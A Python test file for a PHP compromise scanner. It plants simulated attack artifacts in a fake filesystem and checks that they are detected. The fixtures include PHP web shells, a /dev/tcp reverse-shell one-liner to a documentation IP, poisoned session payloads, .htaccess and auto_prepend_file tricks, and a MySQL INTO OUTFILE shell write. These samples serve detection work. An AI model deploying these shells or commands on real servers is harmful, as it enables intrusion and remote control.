"""Session, web root, temp-dir and database checks against a fake filesystem."""

import os
import stat
import time

from php2shell_scanner.checks import database, sessions, tmp_artifacts, webroot
from php2shell_scanner.models import Kind, Severity

from conftest import rules

CHAIN_A_SESSION = ('upload_progress_x|a:5:{s:10:"start_time";i:1760966521;s:14:"content_length";'
                   'i:9999;s:15:"bytes_processed";i:400;s:4:"done";b:0;s:5:"files";a:1:{i:0;'
                   'a:7:{s:10:"field_name";s:1:"f";s:4:"name";s:60:"<?php echo \'___START___\'; '
                   'system(\'id\'); echo \'___END___\';?>";s:8:"tmp_name";N;}}}')
CHAIN_C_SESSION = ('a:1:{s:17:"upload_progress_x";a:5:{s:5:"files";a:1:{i:0;a:2:{s:10:'
                   '"field_name";s:1:"f";s:4:"name";s:52:"x|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}";'
                   '}}}}')
NORMAL_SESSION = 'user_id|i:42;csrf|s:32:"0123456789abcdef0123456789abcdef";'


# ----------------------------------------------------------------------- sessions
def test_session_poisoning_detected(tree, scan_env):
    tree.write("/var/lib/php/sessions/sess_exploitab12cd34ef56ab78cd90", CHAIN_A_SESSION)
    tree.write("/var/lib/php/sessions/sess_k3j4h5g6f7d8s9a0q1w2e3r4t5", CHAIN_C_SESSION)
    tree.write("/var/lib/php/sessions/sess_abcdef0123456789abcdef0123", NORMAL_SESSION)
    ctx, disc = scan_env()
    found = sessions.run(ctx, disc)
    assert {"SESS-POC-SID", "SESS-PHP-CODE", "SESS-SERIALIZED-FILENAME",
            "SESS-UPLOAD-PROGRESS"} <= rules(found)
    flagged = {os.path.basename(f.path) for f in found if f.severity > Severity.INFO}
    assert "sess_abcdef0123456789abcdef0123" not in flagged


def test_session_inflation_and_planted_php(tree, scan_env):
    tree.write("/var/lib/php/sessions/sess_hugesession000000000000000",
               "a|s:1:\"" + "A" * (11 * 1024 * 1024) + "\";")
    tree.write("/var/lib/php/sessions/x.php", "<?php system($_GET[1]);")
    ctx, disc = scan_env()
    by_rule = {f.rule: f for f in sessions.run(ctx, disc)}
    assert by_rule["SESS-INFLATED"].severity == Severity.HIGH
    assert by_rule["SESS-DIR-PHP-FILE"].kind == Kind.COMPROMISE


def test_session_save_path_read_from_leftover_php_ini(tree, scan_env):
    tree.write("/etc/php/8.2/fpm/php.ini", "[Session]\nsession.save_path = \"2;/srv/phpsess\"\n")
    tree.write("/srv/phpsess/a/b/sess_abcabcabc", CHAIN_A_SESSION)
    ctx, disc = scan_env()
    assert "/srv/phpsess" in disc.session_dirs
    assert "SESS-PHP-CODE" in rules(sessions.run(ctx, disc))


# ------------------------------------------------------------------------ webroot
def test_webshells_in_webroot(tree, scan_env):
    tree.write("/var/www/html/wp-content/uploads/2026/10/x.php", "<?php @eval($_POST['a']);?>")
    tree.write("/var/www/html/.cache.php", "<?php echo shell_exec($_GET['c']);")
    tree.write("/var/www/html/images/logo.png", b"\x89PNG\r\n\x1a\n<?php system($_GET['x']); ?>")
    tree.write("/var/www/html/info.php", "<?php phpinfo(); ?>")
    tree.write("/var/www/html/log.php",
               "/usr/sbin/mysqld, Version: 8.0. started with:\nTcp port: 3306  Unix socket: "
               "/run/mysqld/mysqld.sock\n2026 Query select '<?php eval($_POST[1]);?>'")
    ctx, disc = scan_env()
    by_path = {f.path: f for f in webroot.run(ctx, disc)}
    shell = by_path["/var/www/html/wp-content/uploads/2026/10/x.php"]
    assert shell.severity == Severity.CRITICAL and "WEB-PHP-IN-UPLOADS" in shell.meta["rules"]
    assert by_path["/var/www/html/.cache.php"].severity == Severity.CRITICAL
    assert by_path["/var/www/html/images/logo.png"].rule == "WEB-CODE-IN-MEDIA"
    assert by_path["/var/www/html/info.php"].severity == Severity.LOW
    assert by_path["/var/www/html/log.php"].severity == Severity.CRITICAL


def test_webroot_benign_files(tree, scan_env):
    tree.write("/var/www/html/index.php", "<?php require __DIR__ . '/wp-blog-header.php';")
    tree.write("/var/www/html/wp-content/uploads/index.php", "<?php // Silence is golden.")
    tree.write("/var/www/html/wp-content/plugins/x/readme.txt", "== FAQ ==\n<?php the_title(); ?>")
    tree.write("/var/www/html/vendor/bin/phpunit", "#!/usr/bin/env php\n<?php require 'x';")
    tree.write("/var/www/html/.user.ini", "open_basedir=/www/wwwroot/site/:/tmp/\n")
    # regressions found on a real WordPress 6.x + phpMyAdmin 5.2 install
    tree.write("/var/www/html/wp-includes/class-wp-customize-widgets.php",
               "<?php\n/**\n * @param string $setting_id ID for dynamic setting, usually coming "
               "from `$_POST['customized']`.\n */\nfunction f($setting_id) { return 1; }\n")
    tree.write("/var/www/html/wp-includes/blocks/page-list-item.php",
               "<?php\n/**\n * Server-side rendering of the `core/page-list-item` block.\n */\n")
    tree.write("/var/www/html/wp-settings.php",
               "<?php\nwp_functionality_constants();\n// Add magic quotes and set up "
               "$_REQUEST ( $_GET + $_POST )\nwp_magic_quotes();\n")
    tree.write("/var/www/html/pma/libraries/classes/Plugins/Import/Upload/UploadProgress.php",
               "<?php\nnamespace PhpMyAdmin;\nclass UploadProgress { function getId() {} }\n")
    tree.write("/var/www/html/wp-includes/sodium_compat/src/Core/H.php",
               "<?php const L = \"" + "\\xed" * 40 + "\";\n")
    ctx, disc = scan_env()
    noisy = [f for f in webroot.run(ctx, disc) if f.severity > Severity.INFO]
    assert noisy == []


def test_user_ini_htaccess_and_handler_mismatch(tree, scan_env):
    tree.write("/var/www/html/.user.ini", "auto_prepend_file=/tmp/.x.php\n"
                                          "session.serialize_handler=php\n")
    tree.write("/var/www/html/app/.user.ini", "session.serialize_handler = php_serialize\n")
    tree.write("/var/www/html/uploads/.htaccess", "AddType application/x-httpd-php .jpg .php\n")
    tree.write("/var/www/html/img/.htaccess",
               "<FilesMatch \"\\.png$\">\n  SetHandler application/x-httpd-php\n</FilesMatch>\n")
    ctx, disc = scan_env()
    found = webroot.run(ctx, disc)
    assert {"WEB-AUTO-PREPEND", "WEB-HTACCESS-HANDLER", "WEB-HANDLER-MISMATCH"} <= rules(found)
    assert len([f for f in found if f.rule == "WEB-HTACCESS-HANDLER"]) == 2


def test_suid_and_recent_files_in_webroot(tree, scan_env):
    tree.write("/var/www/html/bash", b"\x7fELF....", mode=0o4755)
    tree.write("/var/www/html/new.php", "<?php echo 1;")
    ctx, disc = scan_env(since=time.time() - 3600)
    found = webroot.run(ctx, disc)
    assert "WEB-SUID" in rules(found)
    recent = [f for f in found if f.rule == "WEB-RECENT-PHP"][0]
    assert "/var/www/html/new.php" in recent.meta["paths"]


def test_extra_webroot_from_nginx_config(tree, scan_env):
    tree.write("/etc/nginx/sites-enabled/site", "server {\n  root /data/sites/$host;\n}\n")
    tree.write("/data/sites/example.com/s.php", "<?php system($_REQUEST['c']);")
    ctx, disc = scan_env()
    assert "/data/sites" in disc.webroots
    assert "WEB-EXEC-INPUT" in rules(webroot.run(ctx, disc))


# ---------------------------------------------------------------------------- tmp
def test_tmp_artifacts(tree, scan_env):
    tree.write("/tmp/rce_proof.txt", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n")
    tree.write("/tmp/.x/kdevtmpfsi", b"\x7fELF\x02\x01\x01" + b"\x00" * 64, mode=0o755)
    tree.write("/dev/shm/r.sh", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n")
    tree.write("/var/tmp/s.php", "<?php eval($_POST['z']);")
    tree.write("/tmp/sh", b"\x7fELF", mode=0o4755)
    tree.mkdir("/tmp/...")
    tree.write("/tmp/sess_abcdef", CHAIN_A_SESSION)  # left to the sessions check
    ctx, disc = scan_env()
    found = tmp_artifacts.run(ctx, disc)
    got = rules(found)
    assert {"TMP-COMMAND-OUTPUT", "TMP-ELF", "TMP-DEV-TCP", "TMP-PHP", "TMP-SUID",
            "TMP-ODD-DIR"} <= got
    assert not any(f.path.endswith("sess_abcdef") for f in found)


# ----------------------------------------------------------------------- database
def test_database_backdoors(tree, scan_env):
    tree.write("/usr/lib/mysql/plugin/udf.so", b"\x7fELF...sys_exec...")
    tree.write("/usr/lib/mysql/plugin/auth_socket.so", b"\x7fELF...normal...")
    tree.write("/etc/mysql/conf.d/x.cnf", "[mysqld]\ngeneral_log_file = /var/www/html/l.php\n"
                                          "secure_file_priv =\n")
    tree.write("/var/lib/mysql/wp/s.txt", "<?php system($_GET[1]);?>")
    tree.write("/root/.mysql_history",
               "select\\040'<?php'\\040into\\040outfile\\040'/var/www/html/x.php';\n")
    tree.write("/usr/share/phpmyadmin/RELEASE-DATE-4.8.1", "2018-05-24\n")
    tree.write("/usr/share/phpmyadmin/index.php", "<?php\n")
    tree.symlink("/usr/share/phpmyadmin", "/var/www/html/phpmyadmin")
    tree.write("/etc/phpmyadmin/config.inc.php",
               "// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;\n")
    ctx, disc = scan_env()
    found = database.run(ctx, disc)
    assert {"DB-UDF-BACKDOOR", "DB-LOG-TO-WEBROOT", "DB-SECURE-FILE-PRIV",
            "DB-OUTFILE-IN-DATADIR", "DB-HISTORY-ABUSE", "DB-PMA-PRESENT",
            "DB-PMA-CVE-2018-12613"} <= rules(found)
    assert not any(f.path.endswith("auth_socket.so") for f in found)
    assert len([f for f in found if f.rule == "DB-PMA-PRESENT"]) == 1   # symlink deduped
    assert "DB-PMA-NOPASSWORD" not in rules(found)                      # commented out


def test_mysql_owned_php_in_webroot(tree, scan_env):
    real = tree.write("/var/www/html/out.php", "<?php echo 1; ?>")
    ctx, disc = scan_env()
    st = os.stat(real)
    patched = disc._replace(mysql_uids=frozenset({st.st_uid}))
    found = webroot.run(ctx, patched)
    assert "WEB-OWNED-BY-MYSQL" in {r for f in found for r in (f.meta or {}).get("rules", [])}
    assert stat.S_ISREG(st.st_mode)


# --------------------------------------------------------------------------- apps
def test_app_inventory_and_risks(tree, scan_env):
    from php2shell_scanner.checks import apps
    wp = "/var/www/html/blog"
    tree.write(wp + "/wp-includes/version.php", "<?php\n$wp_version = '6.6.2';\n")
    tree.write(wp + "/wp-content/mu-plugins/loader.php", "<?php // loader\n")
    lv = "/var/www/shop"
    tree.write(lv + "/artisan", "#!/usr/bin/env php\n")
    tree.write(lv + "/.env", "APP_DEBUG=true\nAPP_KEY=base64:x\n")
    tree.write(lv + "/public/.env", "APP_KEY=base64:x\n")
    tp = "/www/wwwroot/tp"
    tree.write(tp + "/thinkphp/base.php", "<?php define('THINK_VERSION', '5.0.22');")
    ctx, disc = scan_env(extra_webroots=("/www/wwwroot",))
    found = {f.rule: f for f in apps.run(ctx, disc)}
    assert {"APP-WP-MU-PLUGINS", "APP-LARAVEL-DEBUG", "APP-LARAVEL-PUBLIC-ENV",
            "APP-THINKPHP-RCE"} <= set(found)
    inventory = " ".join(found["APP-INVENTORY"].meta["paths"])
    assert "WordPress 6.6.2" in inventory and "ThinkPHP 5.0 5.0.22" in inventory


def test_wordpress_ico_include_malware(tree, scan_env):
    tree.write("/var/www/html/wp-config.php",
               "<?php\n@include \"\\x2fvar\\x2fwww\\x2fhtml\\x2fwp-includes\\x2fimages\\x2f.f.ico\";\n"
               "define('DB_NAME', 'wp');\n")
    tree.write("/var/www/html/index.php", "<?php @include('/var/www/html/wp-content/.cache.png');")
    ctx, disc = scan_env()
    got = {r for f in webroot.run(ctx, disc) for r in (f.meta or {}).get("rules", [])}
    assert {"WEB-INCLUDE-ENCODED", "WEB-INCLUDE-NONPHP"} <= got


def test_drupal_multisite_upload_dir(tree, scan_env):
    tree.write("/var/www/html/sites/example.org/files/x.php", "<?php echo shell_exec('id');")
    ctx, disc = scan_env()
    found = [f for f in webroot.run(ctx, disc) if f.path.endswith("files/x.php")]
    assert found and "WEB-PHP-IN-UPLOADS" in found[0].meta["rules"]
